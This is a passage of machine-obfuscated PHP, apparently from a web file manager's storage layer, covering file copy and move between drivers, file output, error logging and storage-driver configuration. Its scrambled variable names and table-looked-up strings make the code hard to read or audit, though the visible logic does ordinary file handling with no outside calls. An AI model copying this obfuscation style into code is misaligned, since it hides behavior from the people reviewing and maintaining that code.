$’ÜØ€ñı = true) { $Ğ©Á™¡‹ =& $_SERVER[—ÌÒğš÷]; $¡É‰¾š‘ = empty($ã˜ç‰‰‰) && $ã˜ç‰‰‰ !== $Ğ©Á™¡‹[212] ? $™ÀµïÔ¾->pathThis($‡Ë– õ) : $ã˜ç‰‰‰; if ($ÒÊéßƒÑ) { $£‰ŞÁÖ = $¦Ôš©ŞÔ->fileNameExist($Æê‡Âí±, $¡É‰¾š‘); $Ò²¨¯ã¢ = $¡É‰¾š‘; $¡É‰¾š‘ = $¦Ôš©ŞÔ->fileNameAuto($Æê‡Âí±, $¡É‰¾š‘, $ÒÊéßƒÑ, !$»çÃœ¯Ğ); if (!$£‰ŞÁÖ || $Ò²¨¯ã¢ != $¡É‰¾š‘) { $ÒÊéßƒÑ = !1; } if ($’ÜØ€ñı && !$ÒÊéßƒÑ) { $¦Ôš©ŞÔ->_data[$Ğ©Á™¡‹[1199]] = !0; } } if ($»çÃœ¯Ğ) { return self::copyFile($™ÀµïÔ¾, $‡Ë– õ, $¦Ôš©ŞÔ, $Æê‡Âí±, $¡É‰¾š‘, $ƒ¬ŒÛõš); } if ($ÒÊéßƒÑ == REPEAT_RENAME_FOLDER) { $ÒÊéßƒÑ = !1; } $‰Çƒ„× = rtrim($Æê‡Âí±, $Ğ©Á™¡‹[8]) . $Ğ©Á™¡‹[8] . $¡É‰¾š‘; $²í¢¯à = $¦Ôš©ŞÔ->mkdir($¦Ôš©ŞÔ->getPath($‰Çƒ„×), $ÒÊéßƒÑ); $Æê‡Âí± = $¦Ôš©ŞÔ->getPathInner($²í¢¯à); $É©—¯·é = $™ÀµïÔ¾->listPath($‡Ë– õ, !0); $É©—¯·é = is_array($É©—¯·é) ? $É©—¯·é : array($Ğ©Á™¡‹[83] => array(), $Ğ©Á™¡‹[82] => array()); $æÚ½ÚÜ“ = array_merge($É©—¯·é[$Ğ©Á™¡‹[83]], $É©—¯·é[$Ğ©Á™¡‹[82]]); foreach ($æÚ½ÚÜ“ as $Æ£´´òò) { $“ö¦ó‹ = $Æ£´´òò[$Ğ©Á™¡‹[33]] == $Ğ©Á™¡‹[214]; $‡Ë– õ = $™ÀµïÔ¾->getPathInner($Æ£´´òò[$Ğ©Á™¡‹[84]]); $¯ÉÅºñğ = self::copyPath($™ÀµïÔ¾, $‡Ë– õ, $¦Ôš©ŞÔ, $Æê‡Âí±, $ÒÊéßƒÑ, $ƒ¬ŒÛõš, $“ö¦ó‹, !1, !1); if (!$¯ÉÅºñğ) { IO::errorTips($Ğ©Á™¡‹[1200] . $‡Ë– õ . $Ğ©Á™¡‹[70] . $Æê‡Âí±); } } self::copyMoveKeepInfo($™ÀµïÔ¾, $‡Ë– õ, $²í¢¯à); return $²í¢¯à; } private static function copyFile($øçÊÁ•”, $á‡èÙÍ, $œ‚§ëŠÉ, $¡¾¨€­, $û¹½‡ˆÍ, $‹ğ‹èÁ½) { $ı‡‡‰ =& $_SERVER[—ÌÒğš÷]; $¡¾¨€­ = $œ‚§ëŠÉ->getPath(rtrim($¡¾¨€­, $ı‡‡‰[8]) . $ı‡‡‰[8] . $û¹½‡ˆÍ); $©£ğ¸şÈ = $ı‡‡‰[1201] . time() . rand_string(5); Hook::trigger($ı‡‡‰[1202], $øçÊÁ•”, $á‡èÙÍ, $œ‚§ëŠÉ, $¡¾¨€­, $û¹½‡ˆÍ, $©£ğ¸şÈ); if (self::driverIsSame($øçÊÁ•”, $œ‚§ëŠÉ)) { if ($‹ğ‹èÁ½) { $×É•­ = $œ‚§ëŠÉ->moveFile($á‡èÙÍ, $¡¾¨€­); } else { $×É•­ = $œ‚§ëŠÉ->copyFile($á‡èÙÍ, $¡¾¨€­); } Hook::trigger($ı‡‡‰[1203], $øçÊÁ•”, $á‡èÙÍ, $œ‚§ëŠÉ, $¡¾¨€­, $û¹½‡ˆÍ, $×É•­); self::copyMoveKeepInfo($øçÊÁ•”, $á‡èÙÍ, $×É•­); return $×É•­; } $Œ‘›ÔÈ‡ = TEMP_FILES; if ($GLOBALS[$ı‡‡‰[6]][$ı‡‡‰[89]][$ı‡‡‰[832]]) { $Œ‘›ÔÈ‡ = $GLOBALS[$ı‡‡‰[6]][$ı‡‡‰[89]][$ı‡‡‰[832]]; } $ÆÕ °£à = $Œ‘›ÔÈ‡; mk_dir($ÆÕ °£à); $ê“££·  = $ÆÕ °£à . $©£ğ¸şÈ; $õ‡¿¯½ = $ê“££· ; $ê“££·  = $øçÊÁ•”->download($á‡èÙÍ, $ê“££· ); $ê“££·  = $øçÊÁ•”->iconvApp($ê“££· ); if (substr($ê“££· , strlen($Œ‘›ÔÈ‡)) == $Œ‘›ÔÈ‡) { $‹ğ‹èÁ½ = !0; } $×É•­ = $œ‚§ëŠÉ->upload($¡¾¨€­, $ê“££· , $‹ğ‹èÁ½); self::remove($õ‡¿¯½); Hook::trigger($ı‡‡‰[1203], $øçÊÁ•”, $á‡èÙÍ, $œ‚§ëŠÉ, $¡¾¨€­, $û¹½‡ˆÍ, $×É•­); self::copyMoveKeepInfo($øçÊÁ•”, $á‡èÙÍ, $×É•­); return $×É•­; } private static function copyMoveKeepInfo($İ¢ÖÀŞ”, $œåšĞÛª, $Òƒ¡Ë×ı) { if (!$Òƒ¡Ë×ı) { return; } $§èœÖüâ = $İ¢ÖÀŞ”->info($œåšĞÛª); if (!is_array($§èœÖüâ)) { return; } IO::setModifyTime($Òƒ¡Ë×ı, $§èœÖüâ[$_SERVER[—ÌÒğš÷][85]]); } public static function pathFather($–Æµõİº) { $˜¦Ø™ôØ = IO::init($–Æµõİº); $’Ò×°´¶ = $˜¦Ø™ôØ->pathFather($˜¦Ø™ôØ->path); return $˜¦Ø™ôØ->getPathOuter($’Ò×°´¶); } public static function fileOut($äïŒ•¬ô, $şş¶¦€ = false, $‡¤€£ÙÎ = false, $Êñ˜ø÷ = '') { $Å©€ùş = self::driverMake($äïŒ•¬ô); if ($Å©€ùş->isFileOutServer()) { return $Å©€ùş->fileOutServer($äïŒ•¬ô, $şş¶¦€, $‡¤€£ÙÎ, $Êñ˜ø÷); } return $Å©€ùş->fileOut($äïŒ•¬ô, $şş¶¦€, $‡¤€£ÙÎ, $Êñ˜ø÷); } public static function fileOutImage($À§ß´µá, $•øĞü³ = 250) { $ÓÅí§ö = array(250, 600, 1200, 2000, 3000, 5000); for ($£ÈçÆæº = 0; $£ÈçÆæº < count($ÓÅí§ö); $£ÈçÆæº++) { if ($£ÈçÆæº == 0 && $•øĞü³ <= $ÓÅí§ö[$£ÈçÆæº]) { $•øĞü³ = $ÓÅí§ö[$£ÈçÆæº]; break; } else { if ($•øĞü³ > $ÓÅí§ö[$£ÈçÆæº - 1] && $•øĞü³ <= $ÓÅí§ö[$£ÈçÆæº]) { $•øĞü³ = $ÓÅí§ö[$£ÈçÆæº]; break; } else { if ($£ÈçÆæº == count($ÓÅí§ö) - 1 && $•øĞü³ > $ÓÅí§ö[$£ÈçÆæº]) { $•øĞü³ = $ÓÅí§ö[$£ÈçÆæº]; break; } } } } $¬¿Ó´ßƒ = self::driverMake($À§ß´µá); if ($¬¿Ó´ßƒ->isFileOutServer()) { return $¬¿Ó´ßƒ->fileOutImageServer($À§ß´µá, $•øĞü³); } return $¬¿Ó´ßƒ->fileOutImage($À§ß´µá, $•øĞü³); } private static function driverIsSame($»ô„ªè, $Ó²áãÖË) { $ªÀûß¤‡ =& $_SERVER[—ÌÒğš÷]; $ÒĞ­õâ¢ = $»ô„ªè->getType(); $†àÎ¿Âù = $Ó²áãÖË->getType(); if ($ÒĞ­õâ¢ != $†àÎ¿Âù) { return !1; } if ($ÒĞ­õâ¢ == $ªÀûß¤‡[793]) { return !0; } if ($ÒĞ­õâ¢ == $ªÀûß¤‡[106]) { return !0; } if ($»ô„ªè->pathDriver == $Ó²áãÖË->pathDriver) { return !0; } return !1; } public static function copyUpdate($×ñ–®ñ¨, $ğóÉ»ˆÕ) { $ïï Ì± =& $_SERVER[—ÌÒğš÷]; if (!IO::exist($×ñ–®ñ¨)) { return !1; } if (!IO::exist($ğóÉ»ˆÕ)) { IO::mkdir($ğóÉ»ˆÕ); } $úÆæÆÓ¤ = array_to_keyvalue(self::listAllSimple($×ñ–®ñ¨), $ïï Ì±[84]); $òÈ¦ = array_to_keyvalue(self::listAllSimple($ğóÉ»ˆÕ), $ïï Ì±[84]); $ãêíû›Å = array(); $êúĞÇıí = array(); foreach ($úÆæÆÓ¤ as $Ü¸¨„Â‘ => $û²İÊğ¯) { if (isset($òÈ¦[$Ü¸¨„Â‘])) { if ($û²İÊğ¯[$ïï Ì±[75]] == 1) { continue; } if ($òÈ¦[$Ü¸¨„Â‘][$ïï Ì±[76]] == $û²İÊğ¯[$ïï Ì±[76]]) { continue; } } if ($û²İÊğ¯[$ïï Ì±[75]] == 1) { $êúĞÇıí[] = $ğóÉ»ˆÕ . $ïï Ì±[8] . trim($Ü¸¨„Â‘, $ïï Ì±[8]); continue; } $‡»–Ï·• = strstr(trim($Ü¸¨„Â‘, $ïï Ì±[8]), $ïï Ì±[8]) ? get_path_father($Ü¸¨„Â‘) : $ïï Ì±[12]; $ãêíû›Å[] = array($ïï Ì±[1204] => $û²İÊğ¯[$ïï Ì±[86]], $ïï Ì±[1205] => rtrim($ğóÉ»ˆÕ, $ïï Ì±[8]) . $ïï Ì±[8] . $‡»–Ï·•, $ïï Ì±[1206] => $û²İÊğ¯); } $úŠÀ ”¾ = array($ïï Ì±[214] => $ãêíû›Å, $ïï Ì±[75] => $êúĞÇıí); Hook::trigger($ïï Ì±[1207], $×ñ–®ñ¨, $ğóÉ»ˆÕ, $úŠÀ ”¾); foreach ($êúĞÇıí as $û²İÊğ¯) { IO::mkdir($û²İÊğ¯); } foreach ($ãêíû›Å as $û²İÊğ¯) { IO::copy($û²İÊğ¯[$ïï Ì±[1204]], $û²İÊğ¯[$ïï Ì±[1205]], REPEAT_REPLACE); } } public static function fileSubstr($“ÌÓû˜‡, $è÷™Âæ, $»ÌëÉú = false) { $áõšóÄÀ =& $_SERVER[—ÌÒğš÷]; $ô…Úà¬ = self::driverMake($“ÌÓû˜‡); $¶Ø‘Ïö = $ô…Úà¬->size($“ÌÓû˜‡); $Ú”Ò•¸ú = $è÷™Âæ; $ °÷À¥Å = $»ÌëÉú; if ($è÷™Âæ < 0) { $è÷™Âæ = $¶Ø‘Ïö + $è÷™Âæ; } if ($»ÌëÉú === !1) { $»ÌëÉú = $¶Ø‘Ïö - $è÷™Âæ; } if ($è÷™Âæ + $»ÌëÉú > $¶Ø‘Ïö) { $»ÌëÉú = $¶Ø‘Ïö - $è÷™Âæ; } if (!$¶Ø‘Ïö && $ô…Úà¬->getType() == $áõšóÄÀ[106] && !$ô…Úà¬->exist($“ÌÓû˜‡)) { $ˆÎ¦³¼ã = get_path_this($“ÌÓû˜‡); $ÉšÙÂê§ = parse_url_query($ˆÎ¦³¼ã); if (is_array($ÉšÙÂê§) && isset($ÉšÙÂê§[$áõšóÄÀ[32]])) { $ˆÎ¦³¼ã = urldecode($ÉšÙÂê§[$áõšóÄÀ[32]]); } throw new Exception($áõšóÄÀ[1208] . LNG($áõšóÄÀ[1209]) . $áõšóÄÀ[1010] . clear_html($ˆÎ¦³¼ã) . $áõšóÄÀ[12]); } if ($»ÌëÉú <= 0) { return $áõšóÄÀ[12]; } if ($è÷™Âæ < 0 || $è÷™Âæ >= $¶Ø‘Ïö || $»ÌëÉú > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\122\x65\x61\144\x20\145\x72\162\x6f\162\x21\40\163\164\x61\x72\x74\x3d{$è÷™Âæ}\73\154\145\x6e\147\164\x68\x3d{$»ÌëÉú}\73\40\x73\x69\172\145\x3d{$¶Ø‘Ïö}\73"); } $©–ƒ½û• = $ô…Úà¬->fileSubstr($“ÌÓû˜‡, $è÷™Âæ, $»ÌëÉú); if (!$©–ƒ½û• && $»ÌëÉú && isset($GLOBALS[$áõšóÄÀ[1210]])) { throw new Exception($GLOBALS[$áõšóÄÀ[1210]][$áõšóÄÀ[1211]]); } return $©–ƒ½û•; } private static function driverMake(&$Ñê£ºÍ) { $øüÌœª =& $_SERVER[—ÌÒğš÷]; $Éİ†çÛ = KodIO::parse($Ñê£ºÍ); if (!self::$driverListSystem) { $ãë¤øí = Model($øüÌœª[803])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ãë¤øí, $øüÌœª[443]); } if ($Éİ†çÛ[$øüÌœª[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Éİ†çÛ[$øüÌœª[443]]]) { return !1; } $Ñê£ºÍ = $Éİ†çÛ[$øüÌœª[1212]]; $ õÅÊÖ„ = self::driverGet($Éİ†çÛ, $Ñê£ºÍ); return $ õÅÊÖ„; } private static function driverGet($¼Ë‘¿…Ê, &$Ç¢€”ï™) { $…–Î‘ÕÎ =& $_SERVER[—ÌÒğš÷]; $œ•™¨ÛĞ = $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1213]]; $ÍÊ‡’€å = $¼Ë‘¿…Ê[$…–Î‘ÕÎ[443]]; switch ($¼Ë‘¿…Ê[$…–Î‘ÕÎ[33]]) { case KodIO::KOD_IO: $ÙçÔ¯Á• = self::$driverListSystem[$ÍÊ‡’€å]; break; case KodIO::KOD_SOURCE: $Ç¢€”ï™ = $ÍÊ‡’€å . $Ç¢€”ï™; $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1215], $…–Î‘ÕÎ[6] => $¼Ë‘¿…Ê); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ø‰•øÏ¶ = $GLOBALS[$…–Î‘ÕÎ[1216]]; self::$driverListUser = array_to_keyvalue($Ø‰•øÏ¶, $…–Î‘ÕÎ[443]); } $ÙçÔ¯Á• = self::$driverListUser[$ÍÊ‡’€å]; break; case KodIO::KOD_SHARE_LINK: $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1217], $…–Î‘ÕÎ[6] => $¼Ë‘¿…Ê); $îïìéË¯ = Action($…–Î‘ÕÎ[1218])->sharePathInfo($¼Ë‘¿…Ê[$…–Î‘ÕÎ[84]]); $Ç¢€”ï™ = $îïìéË¯[$…–Î‘ÕÎ[181]]; if (!$îïìéË¯[$…–Î‘ÕÎ[181]]) { $ÜÅÓ¾ŞÏ = Model($…–Î‘ÕÎ[632])->getInfo($îïìéË¯[$…–Î‘ÕÎ[633]]); $Ç¢€”ï™ = KodIO::clear($ÜÅÓ¾ŞÏ[$…–Î‘ÕÎ[1219]] . $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1212]]); $¼Ë‘¿…Ê[$…–Î‘ÕÎ[528]] = $ÜÅÓ¾ŞÏ; $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1195]] = $Ç¢€”ï™; $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1220], $…–Î‘ÕÎ[6] => $¼Ë‘¿…Ê); } break; case KodIO::KOD_SHARE_ITEM: $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1221], $…–Î‘ÕÎ[6] => $¼Ë‘¿…Ê); $ÜÅÓ¾ŞÏ = Model($…–Î‘ÕÎ[632])->getInfo($¼Ë‘¿…Ê[$…–Î‘ÕÎ[443]]); if ($ÜÅÓ¾ŞÏ[$…–Î‘ÕÎ[181]] == $…–Î‘ÕÎ[212]) { $Ç¢€”ï™ = KodIO::clear($ÜÅÓ¾ŞÏ[$…–Î‘ÕÎ[1219]] . $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1212]]); $¼Ë‘¿…Ê[$…–Î‘ÕÎ[528]] = $ÜÅÓ¾ŞÏ; $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1195]] = $Ç¢€”ï™; $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1222], $…–Î‘ÕÎ[6] => $¼Ë‘¿…Ê); } else { if (!$Ç¢€”ï™) { $Ç¢€”ï™ = $ÜÅÓ¾ŞÏ[$…–Î‘ÕÎ[181]]; } } break; default: $Ç¢€”ï™ = $¼Ë‘¿…Ê[$…–Î‘ÕÎ[84]]; $ÙçÔ¯Á• = array($…–Î‘ÕÎ[1214] => $…–Î‘ÕÎ[1223]); break; } $ÎéÈÚ¸à = $¼Ë‘¿…Ê[$…–Î‘ÕÎ[84]]; if (!isset(self::$driverCache[$ÎéÈÚ¸à])) { $Ñ·Åîµ = strtolower($ÙçÔ¯Á•[$…–Î‘ÕÎ[95]]); $å†ÍËÕ = $GLOBALS[$…–Î‘ÕÎ[6]][$…–Î‘ÕÎ[89]][$…–Î‘ÕÎ[862]]; $•ÇŞ¬âƒ = $…–Î‘ÕÎ[74] . (isset($å†ÍËÕ[$Ñ·Åîµ]) ? $å†ÍËÕ[$Ñ·Åîµ] : ucfirst($Ñ·Åîµ)); if (!class_exists($•ÇŞ¬âƒ)) { show_json("{$•ÇŞ¬âƒ}\40\x6e\x6f\164\40\x65\x78\151\163\164\163\x21", !1); } $ŞÉöÈî‹ = isset($ÙçÔ¯Á•[$…–Î‘ÕÎ[6]]) ? $ÙçÔ¯Á•[$…–Î‘ÕÎ[6]] : !1; self::$driverCache[$ÎéÈÚ¸à] = new $•ÇŞ¬âƒ($ŞÉöÈî‹); } $’ÖºÓãÖ = self::$driverCache[$ÎéÈÚ¸à]; $’ÖºÓãÖ->pathDriver = $œ•™¨ÛĞ; $’ÖºÓãÖ->pathBase = $…–Î‘ÕÎ[12]; if (isset($ÙçÔ¯Á•[$…–Î‘ÕÎ[6]][$…–Î‘ÕÎ[1224]])) { $’ÖºÓãÖ->pathBase = rtrim($ÙçÔ¯Á•[$…–Î‘ÕÎ[6]][$…–Î‘ÕÎ[1224]], $…–Î‘ÕÎ[8]) . $…–Î‘ÕÎ[8]; $Ç¢€”ï™ = $’ÖºÓãÖ->pathBase . ltrim($Ç¢€”ï™, $…–Î‘ÕÎ[8]); } $Ç¢€”ï™ = $’ÖºÓãÖ->getPath($Ç¢€”ï™); if (isset($¼Ë‘¿…Ê[$…–Î‘ÕÎ[1195]])) { $Ç¢€”ï™ = $¼Ë‘¿…Ê[$…–Î‘ÕÎ[1195]]; } $’ÖºÓãÖ->path = $Ç¢€”ï™; return $’ÖºÓãÖ; } public static function errorTips($ÛÊÉì• = false) { $×Ö†ØÖ… =& $_SERVER[—ÌÒğš÷]; static $Áô­¥ç¼ = array(); $ĞŠì—ú« = 1000; if ($ÛÊÉì• === -1) { return $Áô­¥ç¼ ? $Áô­¥ç¼[count($Áô­¥ç¼) - 1] : $×Ö†ØÖ…[12]; } if ($ÛÊÉì• === !1) { return implode($×Ö†ØÖ…[246], $Áô­¥ç¼); } if (count($Áô­¥ç¼) >= $ĞŠì—ú«) { $Áô­¥ç¼ = array_slice($Áô­¥ç¼, $ĞŠì—ú« * 0.5, $ĞŠì—ú«); } $Áô­¥ç¼[] = $ÛÊÉì•; write_log($×Ö†ØÖ…[163] . ACTION . $×Ö†ØÖ…[1225] . $ÛÊÉì•, $×Ö†ØÖ…[1226]); } public static function getLastError($¯ æ£ëÑ = '') { $¬èÉİ”æ = self::errorTips(-1); return $¬èÉİ”æ ? $¬èÉİ”æ : $¯ æ£ëÑ; } } goto c¡¤´óÎÖÙ; c¤œãöÒ¼: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\163\x74\157\x72\141\147\x65\114\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\163\151\172\x65\x4d\x61\170", "\163\x79\x73\164\x65\x6d", "\144\145\146\141\165\154\x74", "\144\162\151\x76\145\x72", "\143\x6f\x6e\x66\x69\x67"); public function listData($¿’È´»Å = false, $åˆö– = "\155\x6f\x64\x69\x66\171\x54\x69\x6d\x65", $İ’‰º ª = false) { $Ã›—È =& $_SERVER[—ÌÒğš÷]; $ëÍÀ©­¡ = parent::listData($¿’È´»Å, $åˆö–, $İ’‰º ª); if ($¿’È´»Å) { return $ëÍÀ©­¡; } $§ÂâéÁ = $this->ioSizeUseGet(array_to_keyvalue($ëÍÀ©­¡, $Ã›—È[12], $Ã›—È[443])); foreach ($ëÍÀ©­¡ as $àØ›È“ => $ÙûÕ÷Ç) { unset($ëÍÀ©­¡[$àØ›È“][$Ã›—È[6]]); $ëÍÀ©­¡[$àØ›È“][$Ã›—È[1876]] = isset($§ÂâéÁ[$ÙûÕ÷Ç[$Ã›—È[443]]]) ? $§ÂâéÁ[$ÙûÕ÷Ç[$Ã›—È[443]]] : 0; } return $ëÍÀ©­¡; } public function ioSizeUseGet($ê’Ş¹•¬) { $ı«ˆéÀà =& $_SERVER[—ÌÒğš÷]; if (!$ê’Ş¹•¬) { return array(); } $¦œì•ûª = $ı«ˆéÀà[2207] . implode($ı«ˆéÀà[50], $ê’Ş¹•¬); $Ş¡äşĞ = Cache::get($¦œì•ûª); if ($Ş¡äşĞ) { return $Ş¡äşĞ; } $‰¯º”‚ = array($ı«ˆéÀà[853] => $ı«ˆéÀà[443], $ı«ˆéÀà[2208] => $ı«ˆéÀà[76]); $ä¦«ÅÎŒ = array($ı«ˆéÀà[853] => array($ı«ˆéÀà[7], $ê’Ş¹•¬)); $Ş¡äşĞ = Model($ı«ˆéÀà[825])->field($‰¯º”‚)->where($ä¦«ÅÎŒ)->group($ı«ˆéÀà[853])->select(); $Ş¡äşĞ = array_to_keyvalue($Ş¡äşĞ, $ı«ˆéÀà[443], $ı«ˆéÀà[76]); Cache::set($¦œì•ûª, $Ş¡äşĞ, 600); return $Ş¡äşĞ; } public function getConfig($ì¯Û‹£À) { $í¾Ñöş³ = parent::listData($ì¯Û‹£À); return json_decode($í¾Ñöş³[$_SERVER[—ÌÒğš÷][6]], !0); } public function update($å†˜ œí, $¿¹‡²Ñû) { $»ïİ„´ü =& $_SERVER[—ÌÒğš÷]; $Íä“øå‡ = $¿¹‡²Ñû[$»ïİ„´ü[32]]; $ññÏ¤ìò = array_to_keyvalue(parent::listData(), $»ïİ„´ü[32]); if (isset($ññÏ¤ìò[$Íä“øå‡]) && $ññÏ¤ìò[$Íä“øå‡][$»ïİ„´ü[443]] != $å†˜ œí) { return !1; } $this->checkPwd($å†˜ œí, $¿¹‡²Ñû); if (isset($¿¹‡²Ñû[$»ïİ„´ü[2209]]) && $¿¹‡²Ñû[$»ïİ„´ü[2209]] == $»ïİ„´ü[88]) { $this->checkConfig($¿¹‡²Ñû); } unset($¿¹‡²Ñû[$»ïİ„´ü[2209]]); $Øº«ÚÎµ = parent::update($å†˜ œí, $¿¹‡²Ñû); if ($Øº«ÚÎµ && $¿¹‡²Ñû[$»ïİ„´ü[37]]) { $Ñƒµõß = 0; foreach ($ññÏ¤ìò as $óÕÒ·) { if ($óÕÒ·[$»ïİ„´ü[37]] && $óÕÒ·[$»ïİ„´ü[443]] != $å†˜ œí) { $Ñƒµõß = $óÕÒ·[$»ïİ„´ü[443]]; parent::update($óÕÒ·[$»ïİ„´ü[443]], array($»ïİ„´ü[37] => 0)); } } $this->updateBackup($å†˜ œí, $Ñƒµõß); } return $Øº«ÚÎµ; } public function add($öåÕµô³) { $˜æ«¶Şë =& $_SERVER[—ÌÒğš÷]; $û³ˆÃ™ó = array_to_keyvalue(parent::listData(), $˜æ«¶Şë[32]); if (isset($û³ˆÃ™ó[$öåÕµô³[$˜æ«¶Şë[32]]])) { return !1; } $this->checkConfig($öåÕµô³); $ëŞÚà¢ = parent::insert($öåÕµô³); if ($ëŞÚà¢ && $öåÕµô³[$˜æ«¶Şë[37]]) { foreach ($û³ˆÃ™ó as $ö„‘Ü¶Ú) { if ($ö„‘Ü¶Ú[$˜æ«¶Şë[37]]) { parent::update($ö„‘Ü¶Ú[$˜æ«¶Şë[443]], array($˜æ«¶Şë[37] => 0)); } } } return $ëŞÚà¢; } public function updateBackup($›ØĞš¯, $ˆÀÓÃÂ) { $ñ½ãªâİ =& $_SERVER[—ÌÒğš÷]; if (!$ˆÀÓÃÂ) { return; } $ÁËš»æø = Model($ñ½ãªâİ[785])->config(); if ($ÁËš»æø[$ñ½ãªâİ[1658]] != $ñ½ãªâİ[88] || $ÁËš»æø[$ñ½ãªâİ[787]] != $ˆÀÓÃÂ) { return; } $’§âå¤ = Model($ñ½ãªâİ[806])->get($ñ½ãªâİ[816]); $’§âå¤ = json_decode($’§âå¤, !0); if (!$’§âå¤) { return; } $’§âå¤[$ñ½ãªâİ[787]] = $›ØĞš¯; Model($ñ½ãªâİ[806])->set(array($ñ½ãªâİ[816] => $’§âå¤)); } public function checkPwd($¢’ÓÄ¿¹, &$ËÉú­Ú) { $îÆğ»‰¶ =& $_SERVER[—ÌÒğš÷]; if (empty($ËÉú­Ú[$îÆğ»‰¶[6]])) { return; } $÷¢¬Áî = json_decode($ËÉú­Ú[$îÆğ»‰¶[6]], !0); $”Ê°¾¢ô = $îÆğ»‰¶[12]; $â¾ÜÍÖğ = array($îÆğ»‰¶[2210], $îÆğ»‰¶[2211], $îÆğ»‰¶[933]); foreach ($â¾ÜÍÖğ as $³±îë) { if (isset($÷¢¬Áî[$³±îë])) { $”Ê°¾¢ô = $³±îë; break; } } if (!$”Ê°¾¢ô) { return; } $’îÃ¶û = $this->getConfig($¢’ÓÄ¿¹); $ñØù•‰Ü = $’îÃ¶û[$”Ê°¾¢ô]; $‹™´şë× = $÷¢¬Áî[$”Ê°¾¢ô]; if ($‹™´şë× == str_repeat($îÆğ»‰¶[203], strlen($ñØù•‰Ü))) { $÷¢¬Áî[$”Ê°¾¢ô] = $ñØù•‰Ü; $ËÉú­Ú[$îÆğ»‰¶[6]] = json_encode($÷¢¬Áî); } else { if ($‹™´şë× != $ñØù•‰Ü) { $ËÉú­Ú[$îÆğ»‰¶[2209]] = $îÆğ»‰¶[88]; } } } public function checkConfig(&$àôÜóô, $ùìµ¬œõ = false) { $ÀßÚ½Õã =& $_SERVER[—ÌÒğš÷]; $£³ì„Ò¹ = strtolower($àôÜóô[$ÀßÚ½Õã[95]]); $Œ”Ë²×‡ = json_decode($àôÜóô[$ÀßÚ½Õã[6]], !0); foreach ($Œ”Ë²×‡ as $Ÿ±‡÷¶ => $¨÷Û‚«Ì) { if (is_string($¨÷Û‚«Ì)) { $Œ”Ë²×‡[$Ÿ±‡÷¶] = trim($¨÷Û‚«Ì); } } $Œ”Ë²×‡[$ÀßÚ½Õã[2212]] = rand_string(6); $“ĞÓ•ë = $GLOBALS[$ÀßÚ½Õã[6]][$ÀßÚ½Õã[89]][$ÀßÚ½Õã[862]]; $èüÖ°ª† = isset($“ĞÓ•ë[$£³ì„Ò¹]) ? $“ĞÓ•ë[$£³ì„Ò¹] : ucfirst($£³ì„Ò¹); $À û‡şú = $ÀßÚ½Õã[74] . $èüÖ°ª†; if (!$èüÖ°ª† || !class_exists($À û‡şú)) { if ($ùìµ¬œõ) { return LNG($ÀßÚ½Õã[2213]); } write_log(array($ÀßÚ½Õã[2214], $àôÜóô, get_caller_info()), $ÀßÚ½Õã[2215]); show_json(LNG($ÀßÚ½Õã[2213]), !1, $àôÜóô); } $£Ÿñ€Ã­ = new $À û‡şú($Œ”Ë²×‡); if (in_array($£³ì„Ò¹, $£Ÿñ€Ã­->objectDriver)) { if (!$£Ÿñ€Ã­->isBucketCors() && !$£Ÿñ€Ã­->setBucketCors()) { $‹³Áà¤ = LNG($ÀßÚ½Õã[2216]); $‹³Áà¤ .= $ÀßÚ½Õã[2217] . LNG($ÀßÚ½Õã[2218]); if ($ùìµ¬œõ) { return $‹³Áà¤; } show_json($‹³Áà¤, !1); } } $ì†Ò¶ˆó = rtrim($Œ”Ë²×‡[$ÀßÚ½Õã[1224]], $ÀßÚ½Õã[8]) . $ÀßÚ½Õã[8]; $óË¬‡ºÈ = $£Ÿñ€Ã­->getPath($ì†Ò¶ˆó . $ÀßÚ½Õã[1228]); if (!$£Ÿñ€Ã­->mkfile($óË¬‡ºÈ)) { if ($ùìµ¬œõ) { return LNG($ÀßÚ½Õã[2216]); } show_json(LNG($ÀßÚ½Õã[2216]), !1); } $Œ”Ë²×‡[$ÀßÚ½Õã[1224]] = $ì†Ò¶ˆó; $àôÜóô[$ÀßÚ½Õã[6]] = json_encode($Œ”Ë²×‡); $àôÜóô[$ÀßÚ½Õã[95]] = $èüÖ°ª†; return !0; } public function driverListSystem() { $³áœ–Ğ¢ =& $_SERVER[—ÌÒğš÷]; $ŞËÖ‚»ş = parent::listData(); $çè³°ç¾ = array(); foreach ($ŞËÖ‚»ş as $óİÄ¼ÑÕ) { unset($óİÄ¼ÑÕ[$³áœ–Ğ¢[215]], $óİÄ¼ÑÕ[$³áœ–Ğ¢[85]]); $óİÄ¼ÑÕ[$³áœ–Ğ¢[6]] = json_decode($óİÄ¼ÑÕ[$³áœ–Ğ¢[6]], !0); $çè³°ç¾[] = $óİÄ¼ÑÕ; } return $çè³°ç¾; } public function defaultDriver() { $üÛòéÙ¦ =& $_SERVER[—ÌÒğš÷]; $ÓÍÌÂ¿˜ = parent::listData(); $ùòüãÕç = array_filter_by_field($ÓÍÌÂ¿˜, $üÛòéÙ¦[37], 1); $ùòüãÕç = $ùòüãÕç[0]; if ($ùòüãÕç) { $ùòüãÕç[$üÛòéÙ¦[6]] = json_decode($ùòüãÕç[$üÛòéÙ¦[6]], !0); } return $ùòüãÕç; } public function driverInfo($æ§…­Ğ”) { $Î‚í™Œˆ =& $_SERVER[—ÌÒğš÷]; $Ïßš×š˜ = array_to_keyvalue(parent::listData(), $Î‚í™Œˆ[443]); if (!isset($Ïßš×š˜[$æ§…­Ğ”])) { return !1; } $ª¤¡Õ = $Ïßš×š˜[$æ§…­Ğ”]; 